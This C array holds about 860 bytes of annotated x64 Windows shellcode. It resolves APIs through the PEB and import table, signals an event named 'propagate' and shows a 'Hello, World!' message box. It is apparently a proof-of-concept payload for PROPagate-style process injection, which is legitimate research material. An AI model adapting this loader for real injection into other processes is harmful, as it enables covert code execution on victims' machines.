
#define PAYLOAD_SIZE 860

char PAYLOAD[] = {
  /* 0000 */ "\x48\x8b\xc4"                         /* mov rax, rsp                     */
  /* 0003 */ "\x48\x89\x58\x08"                     /* mov [rax+0x8], rbx               */
  /* 0007 */ "\x48\x89\x70\x10"                     /* mov [rax+0x10], rsi              */
  /* 000B */ "\x48\x89\x78\x18"                     /* mov [rax+0x18], rdi              */
  /* 000F */ "\x4c\x89\x60\x20"                     /* mov [rax+0x20], r12              */
  /* 0013 */ "\x55"                                 /* push rbp                         */
  /* 0014 */ "\x41\x56"                             /* push r14                         */
  /* 0016 */ "\x41\x57"                             /* push r15                         */
  /* 0018 */ "\x48\x8d\x68\xb1"                     /* lea rbp, [rax-0x4f]              */
  /* 001C */ "\x48\x81\xec\xf0\x00\x00\x00"         /* sub rsp, 0xf0                    */
  /* 0023 */ "\x83\x65\x0f\x00"                     /* and dword [rbp+0xf], 0x0         */
  /* 0027 */ "\x41\xb8\x65\x48\x61\x6e"             /* mov r8d, 0x6e614865              */
  /* 002D */ "\x83\x64\x24\x30\x00"                 /* and dword [rsp+0x30], 0x0        */
  /* 0032 */ "\xb9\x61\x67\x61\x74"                 /* mov ecx, 0x74616761              */
  /* 0037 */ "\x83\x65\x97\x00"                     /* and dword [rbp-0x69], 0x0        */
  /* 003B */ "\xb8\x65\x00\x00\x00"                 /* mov eax, 0x65                    */
  /* 0040 */ "\xc7\x45\xdf\x47\x65\x74\x50"         /* mov dword [rbp-0x21], 0x50746547 */
  /* 0047 */ "\x41\xba\x6b\x65\x72\x6e"             /* mov r10d, 0x6e72656b             */
  /* 004D */ "\xc7\x45\xe3\x72\x6f\x63\x41"         /* mov dword [rbp-0x1d], 0x41636f72 */
  /* 0054 */ "\x41\xb9\x65\x6c\x33\x32"             /* mov r9d, 0x32336c65              */
  /* 005A */ "\xc7\x45\xe7\x64\x64\x72\x65"         /* mov dword [rbp-0x19], 0x65726464 */
  /* 0061 */ "\xc7\x45\xeb\x73\x73\x00\x00"         /* mov dword [rbp-0x15], 0x7373     */
  /* 0068 */ "\xc7\x45\xff\x47\x65\x74\x4d"         /* mov dword [rbp-0x1], 0x4d746547  */
  /* 006F */ "\xc7\x45\x03\x6f\x64\x75\x6c"         /* mov dword [rbp+0x3], 0x6c75646f  */
  /* 0076 */ "\x44\x89\x45\x07"                     /* mov [rbp+0x7], r8d               */
  /* 007A */ "\xc7\x45\x0b\x64\x6c\x65\x41"         /* mov dword [rbp+0xb], 0x41656c64  */
  /* 0081 */ "\x44\x89\x54\x24\x28"                 /* mov [rsp+0x28], r10d             */
  /* 0086 */ "\x44\x89\x4c\x24\x2c"                 /* mov [rsp+0x2c], r9d              */
  /* 008B */ "\xc7\x44\x24\x20\x75\x73\x65\x72"     /* mov dword [rsp+0x20], 0x72657375 */
  /* 0093 */ "\xc7\x44\x24\x24\x33\x32\x00\x00"     /* mov dword [rsp+0x24], 0x3233     */
  /* 009B */ "\xc7\x45\xaf\x4d\x65\x73\x73"         /* mov dword [rbp-0x51], 0x7373654d */
  /* 00A2 */ "\xc7\x45\xb3\x61\x67\x65\x42"         /* mov dword [rbp-0x4d], 0x42656761 */
  /* 00A9 */ "\xc7\x45\xb7\x6f\x78\x41\x00"         /* mov dword [rbp-0x49], 0x41786f   */
  /* 00B0 */ "\xc7\x45\xef\x48\x65\x6c\x6c"         /* mov dword [rbp-0x11], 0x6c6c6548 */
  /* 00B7 */ "\xc7\x45\xf3\x6f\x2c\x20\x57"         /* mov dword [rbp-0xd], 0x57202c6f  */
  /* 00BE */ "\xc7\x45\xf7\x6f\x72\x6c\x64"         /* mov dword [rbp-0x9], 0x646c726f  */
  /* 00C5 */ "\xc7\x45\xfb\x21\x00\x00\x00"         /* mov dword [rbp-0x5], 0x21        */
  /* 00CC */ "\xc7\x45\xcf\x50\x52\x4f\x50"         /* mov dword [rbp-0x31], 0x504f5250 */
  /* 00D3 */ "\x89\x4d\xd3"                         /* mov [rbp-0x2d], ecx              */
  /* 00D6 */ "\x89\x45\xd7"                         /* mov [rbp-0x29], eax              */
  /* 00D9 */ "\xc7\x45\xbf\x70\x72\x6f\x70"         /* mov dword [rbp-0x41], 0x706f7270 */
  /* 00E0 */ "\x89\x4d\xc3"                         /* mov [rbp-0x3d], ecx              */
  /* 00E3 */ "\x89\x45\xc7"                         /* mov [rbp-0x39], eax              */
  /* 00E6 */ "\xc7\x45\x8f\x53\x65\x74\x45"         /* mov dword [rbp-0x71], 0x45746553 */
  /* 00ED */ "\xc7\x45\x93\x76\x65\x6e\x74"         /* mov dword [rbp-0x6d], 0x746e6576 */
  /* 00F4 */ "\xc7\x44\x24\x38\x4f\x70\x65\x6e"     /* mov dword [rsp+0x38], 0x6e65704f */
  /* 00FC */ "\xc7\x45\x83\x45\x76\x65\x6e"         /* mov dword [rbp-0x7d], 0x6e657645 */
  /* 0103 */ "\xc7\x45\x87\x74\x41\x00\x00"         /* mov dword [rbp-0x79], 0x4174     */
  /* 010A */ "\xc7\x45\x9f\x43\x6c\x6f\x73"         /* mov dword [rbp-0x61], 0x736f6c43 */
  /* 0111 */ "\x44\x89\x45\xa3"                     /* mov [rbp-0x5d], r8d              */
  /* 0115 */ "\xc7\x45\xa7\x64\x6c\x65\x00"         /* mov dword [rbp-0x59], 0x656c64   */
  /* 011C */ "\xc7\x45\x17\x47\x65\x74\x46"         /* mov dword [rbp+0x17], 0x46746547 */
  /* 0123 */ "\xc7\x45\x1b\x6f\x72\x65\x67"         /* mov dword [rbp+0x1b], 0x6765726f */
  /* 012A */ "\xc7\x45\x1f\x72\x6f\x75\x6e"         /* mov dword [rbp+0x1f], 0x6e756f72 */
  /* 0131 */ "\xc7\x45\x23\x64\x57\x69\x6e"         /* mov dword [rbp+0x23], 0x6e695764 */
  /* 0138 */ "\xc7\x45\x27\x64\x6f\x77\x00"         /* mov dword [rbp+0x27], 0x776f64   */
  /* 013F */ "\x83\xfa\x10"                         /* cmp edx, 0x10                    */
  /* 0142 */ "\x0f\x85\x16\x01\x00\x00"             /* jnz 0x25e                        */
  /* 0148 */ "\x65\x48\x8b\x04\x25\x60\x00\x00\x00" /* mov rax, [gs:0x60]               */
  /* 0151 */ "\x48\x8b\x78\x10"                     /* mov rdi, [rax+0x10]              */
  /* 0155 */ "\x48\x63\x47\x3c"                     /* movsxd rax, dword [rdi+0x3c]     */
  /* 0159 */ "\x8b\x9c\x38\x90\x00\x00\x00"         /* mov ebx, [rax+rdi+0x90]          */
  /* 0160 */ "\x48\x03\xdf"                         /* add rbx, rdi                     */
  /* 0163 */ "\x8b\x43\x0c"                         /* mov eax, [rbx+0xc]               */
  /* 0166 */ "\x85\xc0"                             /* test eax, eax                    */
  /* 0168 */ "\x74\x2b"                             /* jz 0x195                         */
  /* 016A */ "\xba\x20\x20\x20\x20"                 /* mov edx, 0x20202020              */
  /* 016F */ "\x8b\xc8"                             /* mov ecx, eax                     */
  /* 0171 */ "\x8b\x04\x39"                         /* mov eax, [rcx+rdi]               */
  /* 0174 */ "\x0b\xc2"                             /* or eax, edx                      */
  /* 0176 */ "\x41\x3b\xc2"                         /* cmp eax, r10d                    */
  /* 0179 */ "\x75\x0f"                             /* jnz 0x18a                        */
  /* 017B */ "\x8b\x44\x39\x04"                     /* mov eax, [rcx+rdi+0x4]           */
  /* 017F */ "\x0b\xc2"                             /* or eax, edx                      */
  /* 0181 */ "\x41\x3b\xc1"                         /* cmp eax, r9d                     */
  /* 0184 */ "\x0f\x84\xf7\x00\x00\x00"             /* jz 0x281                         */
  /* 018A */ "\x8b\x43\x20"                         /* mov eax, [rbx+0x20]              */
  /* 018D */ "\x48\x83\xc3\x14"                     /* add rbx, 0x14                    */
  /* 0191 */ "\x85\xc0"                             /* test eax, eax                    */
  /* 0193 */ "\x75\xda"                             /* jnz 0x16f                        */
  /* 0195 */ "\x48\x8b\x74\x24\x20"                 /* mov rsi, [rsp+0x20]              */
  /* 019A */ "\x48\x8b\x5c\x24\x20"                 /* mov rbx, [rsp+0x20]              */
  /* 019F */ "\x48\x85\xf6"                         /* test rsi, rsi                    */
  /* 01A2 */ "\x0f\x84\xb6\x00\x00\x00"             /* jz 0x25e                         */
  /* 01A8 */ "\x48\x85\xdb"                         /* test rbx, rbx                    */
  /* 01AB */ "\x0f\x84\xad\x00\x00\x00"             /* jz 0x25e                         */
  /* 01B1 */ "\x48\x8d\x4c\x24\x20"                 /* lea rcx, [rsp+0x20]              */
  /* 01B6 */ "\xff\xd6"                             /* call rsi                         */
  /* 01B8 */ "\x48\x8d\x4c\x24\x28"                 /* lea rcx, [rsp+0x28]              */
  /* 01BD */ "\x4c\x8b\xf0"                         /* mov r14, rax                     */
  /* 01C0 */ "\xff\xd6"                             /* call rsi                         */
  /* 01C2 */ "\x48\x8b\xf8"                         /* mov rdi, rax                     */
  /* 01C5 */ "\x4d\x85\xf6"                         /* test r14, r14                    */
  /* 01C8 */ "\x0f\x84\x90\x00\x00\x00"             /* jz 0x25e                         */
  /* 01CE */ "\x48\x85\xc0"                         /* test rax, rax                    */
  /* 01D1 */ "\x0f\x84\x87\x00\x00\x00"             /* jz 0x25e                         */
  /* 01D7 */ "\x48\x8d\x54\x24\x38"                 /* lea rdx, [rsp+0x38]              */
  /* 01DC */ "\x48\x8b\xc8"                         /* mov rcx, rax                     */
  /* 01DF */ "\xff\xd3"                             /* call rbx                         */
  /* 01E1 */ "\x48\x8d\x55\x8f"                     /* lea rdx, [rbp-0x71]              */
  /* 01E5 */ "\x48\x8b\xcf"                         /* mov rcx, rdi                     */
  /* 01E8 */ "\x4c\x8b\xe0"                         /* mov r12, rax                     */
  /* 01EB */ "\xff\xd3"                             /* call rbx                         */
  /* 01ED */ "\x48\x8d\x55\x9f"                     /* lea rdx, [rbp-0x61]              */
  /* 01F1 */ "\x48\x8b\xcf"                         /* mov rcx, rdi                     */
  /* 01F4 */ "\x48\x8b\xf0"                         /* mov rsi, rax                     */
  /* 01F7 */ "\xff\xd3"                             /* call rbx                         */
  /* 01F9 */ "\x48\x8d\x55\x17"                     /* lea rdx, [rbp+0x17]              */
  /* 01FD */ "\x49\x8b\xce"                         /* mov rcx, r14                     */
  /* 0200 */ "\x48\x8b\xf8"                         /* mov rdi, rax                     */
  /* 0203 */ "\xff\xd3"                             /* call rbx                         */
  /* 0205 */ "\x48\x8d\x55\xaf"                     /* lea rdx, [rbp-0x51]              */
  /* 0209 */ "\x49\x8b\xce"                         /* mov rcx, r14                     */
  /* 020C */ "\x4c\x8b\xf8"                         /* mov r15, rax                     */
  /* 020F */ "\xff\xd3"                             /* call rbx                         */
  /* 0211 */ "\x4c\x8b\xf0"                         /* mov r14, rax                     */
  /* 0214 */ "\x4d\x85\xe4"                         /* test r12, r12                    */
  /* 0217 */ "\x74\x45"                             /* jz 0x25e                         */
  /* 0219 */ "\x48\x85\xf6"                         /* test rsi, rsi                    */
  /* 021C */ "\x74\x40"                             /* jz 0x25e                         */
  /* 021E */ "\x48\x85\xc0"                         /* test rax, rax                    */
  /* 0221 */ "\x74\x3b"                             /* jz 0x25e                         */
  /* 0223 */ "\x4d\x85\xff"                         /* test r15, r15                    */
  /* 0226 */ "\x74\x36"                             /* jz 0x25e                         */
  /* 0228 */ "\x48\x85\xff"                         /* test rdi, rdi                    */
  /* 022B */ "\x74\x31"                             /* jz 0x25e                         */
  /* 022D */ "\xba\x01\x00\x00\x00"                 /* mov edx, 0x1                     */
  /* 0232 */ "\x4c\x8d\x45\xbf"                     /* lea r8, [rbp-0x41]               */
  /* 0236 */ "\x8d\x4a\x01"                         /* lea ecx, [rdx+0x1]               */
  /* 0239 */ "\x41\xff\xd4"                         /* call r12                         */
  /* 023C */ "\x48\x8b\xd8"                         /* mov rbx, rax                     */
  /* 023F */ "\x48\x85\xc0"                         /* test rax, rax                    */
  /* 0242 */ "\x74\x1a"                             /* jz 0x25e                         */
  /* 0244 */ "\x48\x8b\xc8"                         /* mov rcx, rax                     */
  /* 0247 */ "\xff\xd6"                             /* call rsi                         */
  /* 0249 */ "\x48\x8b\xcb"                         /* mov rcx, rbx                     */
  /* 024C */ "\xff\xd7"                             /* call rdi                         */
  /* 024E */ "\x45\x33\xc9"                         /* xor r9d, r9d                     */
  /* 0251 */ "\x4c\x8d\x45\xcf"                     /* lea r8, [rbp-0x31]               */
  /* 0255 */ "\x48\x8d\x55\xef"                     /* lea rdx, [rbp-0x11]              */
  /* 0259 */ "\x33\xc9"                             /* xor ecx, ecx                     */
  /* 025B */ "\x41\xff\xd6"                         /* call r14                         */
  /* 025E */ "\x4c\x8d\x9c\x24\xf0\x00\x00\x00"     /* lea r11, [rsp+0xf0]              */
  /* 0266 */ "\x33\xc0"                             /* xor eax, eax                     */
  /* 0268 */ "\x49\x8b\x5b\x20"                     /* mov rbx, [r11+0x20]              */
  /* 026C */ "\x49\x8b\x73\x28"                     /* mov rsi, [r11+0x28]              */
  /* 0270 */ "\x49\x8b\x7b\x30"                     /* mov rdi, [r11+0x30]              */
  /* 0274 */ "\x4d\x8b\x63\x38"                     /* mov r12, [r11+0x38]              */
  /* 0278 */ "\x49\x8b\xe3"                         /* mov rsp, r11                     */
  /* 027B */ "\x41\x5f"                             /* pop r15                          */
  /* 027D */ "\x41\x5e"                             /* pop r14                          */
  /* 027F */ "\x5d"                                 /* pop rbp                          */
  /* 0280 */ "\xc3"                                 /* ret                              */
  /* 0281 */ "\x4c\x8d\x45\xff"                     /* lea r8, [rbp-0x1]                */
  /* 0285 */ "\x48\x8b\xd7"                         /* mov rdx, rdi                     */
  /* 0288 */ "\x48\x8b\xcb"                         /* mov rcx, rbx                     */
  /* 028B */ "\xe8\x1c\x00\x00\x00"                 /* call 0x2ac                       */
  /* 0290 */ "\x4c\x8d\x45\xdf"                     /* lea r8, [rbp-0x21]               */
  /* 0294 */ "\x48\x8b\xd7"                         /* mov rdx, rdi                     */
  /* 0297 */ "\x48\x8b\xcb"                         /* mov rcx, rbx                     */
  /* 029A */ "\x48\x8b\xf0"                         /* mov rsi, rax                     */
  /* 029D */ "\xe8\x0a\x00\x00\x00"                 /* call 0x2ac                       */
  /* 02A2 */ "\x48\x8b\xd8"                         /* mov rbx, rax                     */
  /* 02A5 */ "\xe9\xf5\xfe\xff\xff"                 /* jmp 0x19f                        */
  /* 02AA */ "\xcc"                                 /* int3                             */
  /* 02AB */ "\xcc"                                 /* int3                             */
  /* 02AC */ "\x48\x8b\xc4"                         /* mov rax, rsp                     */
  /* 02AF */ "\x48\x89\x58\x08"                     /* mov [rax+0x8], rbx               */
  /* 02B3 */ "\x48\x89\x68\x10"                     /* mov [rax+0x10], rbp              */
  /* 02B7 */ "\x48\x89\x70\x18"                     /* mov [rax+0x18], rsi              */
  /* 02BB */ "\x48\x89\x78\x20"                     /* mov [rax+0x20], rdi              */
  /* 02BF */ "\x41\x56"                             /* push r14                         */
  /* 02C1 */ "\x48\x83\xec\x20"                     /* sub rsp, 0x20                    */
  /* 02C5 */ "\x8b\x31"                             /* mov esi, [rcx]                   */
  /* 02C7 */ "\x33\xdb"                             /* xor ebx, ebx                     */
  /* 02C9 */ "\x8b\x79\x10"                         /* mov edi, [rcx+0x10]              */
  /* 02CC */ "\x48\x03\xf2"                         /* add rsi, rdx                     */
  /* 02CF */ "\x48\x03\xfa"                         /* add rdi, rdx                     */
  /* 02D2 */ "\x4d\x8b\xf0"                         /* mov r14, r8                      */
  /* 02D5 */ "\x48\x8b\xea"                         /* mov rbp, rdx                     */
  /* 02D8 */ "\x48\x8b\x06"                         /* mov rax, [rsi]                   */
  /* 02DB */ "\x48\x85\xc0"                         /* test rax, rax                    */
  /* 02DE */ "\x74\x2f"                             /* jz 0x30f                         */
  /* 02E0 */ "\x48\x2b\xf7"                         /* sub rsi, rdi                     */
  /* 02E3 */ "\x48\x85\xc0"                         /* test rax, rax                    */
  /* 02E6 */ "\x78\x15"                             /* js 0x2fd                         */
  /* 02E8 */ "\x8b\xc0"                             /* mov eax, eax                     */
  /* 02EA */ "\x48\x8d\x55\x02"                     /* lea rdx, [rbp+0x2]               */
  /* 02EE */ "\x48\x03\xd0"                         /* add rdx, rax                     */
  /* 02F1 */ "\x49\x8b\xce"                         /* mov rcx, r14                     */
  /* 02F4 */ "\xe8\x37\x00\x00\x00"                 /* call 0x330                       */
  /* 02F9 */ "\x85\xc0"                             /* test eax, eax                    */
  /* 02FB */ "\x74\x0f"                             /* jz 0x30c                         */
  /* 02FD */ "\x48\x83\xc7\x08"                     /* add rdi, 0x8                     */
  /* 0301 */ "\x48\x8b\x04\x3e"                     /* mov rax, [rsi+rdi]               */
  /* 0305 */ "\x48\x85\xc0"                         /* test rax, rax                    */
  /* 0308 */ "\x74\x05"                             /* jz 0x30f                         */
  /* 030A */ "\xeb\xd7"                             /* jmp 0x2e3                        */
  /* 030C */ "\x48\x8b\x1f"                         /* mov rbx, [rdi]                   */
  /* 030F */ "\x48\x8b\x6c\x24\x38"                 /* mov rbp, [rsp+0x38]              */
  /* 0314 */ "\x48\x8b\xc3"                         /* mov rax, rbx                     */
  /* 0317 */ "\x48\x8b\x5c\x24\x30"                 /* mov rbx, [rsp+0x30]              */
  /* 031C */ "\x48\x8b\x74\x24\x40"                 /* mov rsi, [rsp+0x40]              */
  /* 0321 */ "\x48\x8b\x7c\x24\x48"                 /* mov rdi, [rsp+0x48]              */
  /* 0326 */ "\x48\x83\xc4\x20"                     /* add rsp, 0x20                    */
  /* 032A */ "\x41\x5e"                             /* pop r14                          */
  /* 032C */ "\xc3"                                 /* ret                              */
  /* 032D */ "\xcc"                                 /* int3                             */
  /* 032E */ "\xcc"                                 /* int3                             */
  /* 032F */ "\xcc"                                 /* int3                             */
  /* 0330 */ "\x44\x8a\x01"                         /* mov r8b, [rcx]                   */
  /* 0333 */ "\x45\x84\xc0"                         /* test r8b, r8b                    */
  /* 0336 */ "\x74\x1a"                             /* jz 0x352                         */
  /* 0338 */ "\x41\x8a\xc0"                         /* mov al, r8b                      */
  /* 033B */ "\x48\x2b\xca"                         /* sub rcx, rdx                     */
  /* 033E */ "\x44\x8a\xc0"                         /* mov r8b, al                      */
  /* 0341 */ "\x3a\x02"                             /* cmp al, [rdx]                    */
  /* 0343 */ "\x75\x0d"                             /* jnz 0x352                        */
  /* 0345 */ "\x48\xff\xc2"                         /* inc rdx                          */
  /* 0348 */ "\x8a\x04\x11"                         /* mov al, [rcx+rdx]                */
  /* 034B */ "\x44\x8a\xc0"                         /* mov r8b, al                      */
  /* 034E */ "\x84\xc0"                             /* test al, al                      */
  /* 0350 */ "\x75\xec"                             /* jnz 0x33e                        */
  /* 0352 */ "\x0f\xb6\x0a"                         /* movzx ecx, byte [rdx]            */
  /* 0355 */ "\x41\x0f\xb6\xc0"                     /* movzx eax, r8b                   */
  /* 0359 */ "\x2b\xc1"                             /* sub eax, ecx                     */
  /* 035B */ "\xc3"                                 /* ret                              */
};